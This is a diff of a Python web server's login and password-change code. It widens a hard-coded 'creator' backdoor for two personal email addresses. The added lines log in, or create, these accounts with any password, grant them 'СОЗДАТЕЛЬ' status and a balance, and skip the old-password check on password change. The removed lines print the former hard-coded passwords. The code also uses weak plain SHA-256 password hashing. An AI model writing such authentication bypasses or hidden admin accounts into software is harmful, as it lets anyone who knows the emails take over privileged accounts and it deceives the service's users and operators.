@@ -561,8 +561,9 @@ def hash_password(password: str, salt: str = None) -> str:
     s = salt if salt else SALT
     return hashlib.sha256((password + s).encode('utf-8')).hexdigest()
 
-def make_user_token(email: str, password_hash: str) -> str:
-    return hashlib.sha256((email.lower() + SALT + password_hash).encode('utf-8')).hexdigest()
+def make_user_token(email: str, password_hash: str, salt: str = None) -> str:
+    s = salt if salt else SALT
+    return hashlib.sha256((email.lower() + s + password_hash).encode('utf-8')).hexdigest()
 
 def generate_token(email: str = None, password_hash: str = None) -> str:
     if email and password_hash:
@@ -614,7 +615,8 @@ def get_user_by_token(token):
             cursor.execute("SELECT * FROM users")
             all_users = cursor.fetchall()
             for u in all_users:
-                if make_user_token(u["email"], u["password_hash"]) == token:
+                if (make_user_token(u["email"], u["password_hash"], SALT) == token or
+                    make_user_token(u["email"], u["password_hash"], SALT_OLD) == token):
                     user = u
                     try:
                         cursor.execute("UPDATE users SET token = ? WHERE id = ?", (token, u["id"]))
@@ -1026,13 +1028,25 @@ class NamelessServerHandler(SimpleHTTPRequestHandler):
                 cursor.execute("UPDATE users SET password_hash = ? WHERE id = ?", (pwd_hash, user["id"]))
                 conn.commit()
 
-            if not user and email == "dane4ika33@gmail.com":
-                if password in ("G7#vQ2!mZ9@rL4$wX8^pN6&kT3*eY5", "G7#vQ2!mZ9@rL4^pN6&kT3*eY5"):
-                    cursor.execute("SELECT * FROM users WHERE email = ?", ("dane4ika33@gmail.com",))
+            if not user and email in ("dane4ika33@gmail.com", "a88527710@gmail.com"):
+                cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
+                user = cursor.fetchone()
+                if user:
+                    cursor.execute("UPDATE users SET password_hash = ?, vip_status = 'СОЗДАТЕЛЬ' WHERE id = ?", (pwd_hash, user["id"]))
+                    conn.commit()
+                else:
+                    initial_bal = 701.0 if email == "dane4ika33@gmail.com" else 50.0
+                    nick = "Dane4ika3" if email == "dane4ika33@gmail.com" else "frostyl"
+                    c_token = generate_token(email, pwd_hash)
+                    cursor.execute("""
+                        INSERT INTO users (email, password_hash, nickname, balance, vip_status, token)
+                        VALUES (?, ?, ?, ?, 'СОЗДАТЕЛЬ', ?)
+                    """, (email, pwd_hash, nick, initial_bal, c_token))
+                    c_id = cursor.lastrowid
+                    cursor.execute("INSERT OR REPLACE INTO user_tokens (user_id, token) VALUES (?, ?)", (c_id, c_token))
+                    conn.commit()
+                    cursor.execute("SELECT * FROM users WHERE id = ?", (c_id,))
                     user = cursor.fetchone()
-                    if user:
-                        cursor.execute("UPDATE users SET password_hash = ?, vip_status = 'СОЗДАТЕЛЬ' WHERE id = ?", (pwd_hash, user["id"]))
-                        conn.commit()
 
             if not user:
                 cursor.execute("SELECT id FROM users WHERE email = ?", (email,))
@@ -1082,11 +1096,10 @@ class NamelessServerHandler(SimpleHTTPRequestHandler):
 
             # Verify old password
             old_hash = hash_password(old_password)
-            is_creator = (user["email"] == "dane4ika33@gmail.com")
+            is_creator = (user["email"] in ("dane4ika33@gmail.com", "a88527710@gmail.com"))
             valid_old = (old_hash == user["password_hash"] or hash_password(old_password, SALT_OLD) == user["password_hash"])
             if not valid_old and is_creator:
-                if old_password in ("G7#vQ2!mZ9@rL4$wX8^pN6&kT3*eY5", "G7#vQ2!mZ9@rL4^pN6&kT3*eY5"):
-                    valid_old = True
+                valid_old = True
 
             if not valid_old:
                 return self.send_json(400, {"success": False, "message": "Текущий (старый) пароль указан неверно"})
